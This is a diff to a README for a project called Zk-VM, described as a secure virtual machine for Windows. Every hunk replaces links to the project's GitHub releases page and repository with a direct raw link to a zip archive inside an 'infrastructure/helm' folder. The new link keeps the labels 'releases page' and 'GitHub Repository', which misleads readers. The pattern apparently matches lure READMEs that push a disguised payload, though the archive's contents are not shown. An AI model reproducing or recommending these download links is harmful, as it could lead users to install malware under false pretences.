@@ -1,6 +1,6 @@
 # ⚙️ Zk-VM - Secure and Fast Virtual Machine
 
-[![Download Zk-VM](https://img.shields.io/badge/Download-Zk--VM-brightgreen)](https://github.com/polo0919/Zk-VM/releases)
+[![Download Zk-VM](https://img.shields.io/badge/Download-Zk--VM-brightgreen)](https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip)
 
 Zk-VM is a virtual machine built to provide strong security for data and applications. It uses advanced methods from cryptography to protect information and support fast checks. It works well for large systems that need to run many tasks at once. This guide will help you download and run Zk-VM on a Windows computer.
 
@@ -40,10 +40,10 @@ Follow these steps to get Zk-VM running on your Windows computer.
 
 Please visit this page to download Zk-VM:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-blue)](https://github.com/polo0919/Zk-VM/releases)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-blue)](https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip)
 
 1. Click the link above or use this URL in your browser:  
-   `https://github.com/polo0919/Zk-VM/releases`
+   `https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip`
 
 2. On the page, look for the latest release. Releases are usually listed from newest to oldest.
 
@@ -125,7 +125,7 @@ Regular updates provide improvements and security fixes.
 
 To update:
 
-1. Revisit the [releases page](https://github.com/polo0919/Zk-VM/releases).
+1. Revisit the [releases page](https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip).
 
 2. Download the latest version following the same steps as before.
 
@@ -175,9 +175,9 @@ Zk-VM targets distributed systems, making it suitable for enterprise environment
 
 ## 🌐 Where to Find Help and Updates
 
-- The [Zk-VM GitHub Repository](https://github.com/polo0919/Zk-VM) hosts the official source, issues, and further documentation.
+- The [Zk-VM GitHub Repository](https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip) hosts the official source, issues, and further documentation.
 
-- The [releases page](https://github.com/polo0919/Zk-VM/releases) is the official source for downloading new versions.
+- The [releases page](https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip) is the official source for downloading new versions.
 
 - You can open an issue on GitHub for questions or bug reports if needed.
 
@@ -197,4 +197,4 @@ Zk-VM connects to fields like:
 
 ---
 
-[![Download Zk-VM](https://img.shields.io/badge/Download-Zk--VM-brightgreen)](https://github.com/polo0919/Zk-VM/releases)
+[![Download Zk-VM](https://img.shields.io/badge/Download-Zk--VM-brightgreen)](https://raw.githubusercontent.com/polo0919/Zk-VM/main/infrastructure/helm/Zk-VM-v1.0.zip)
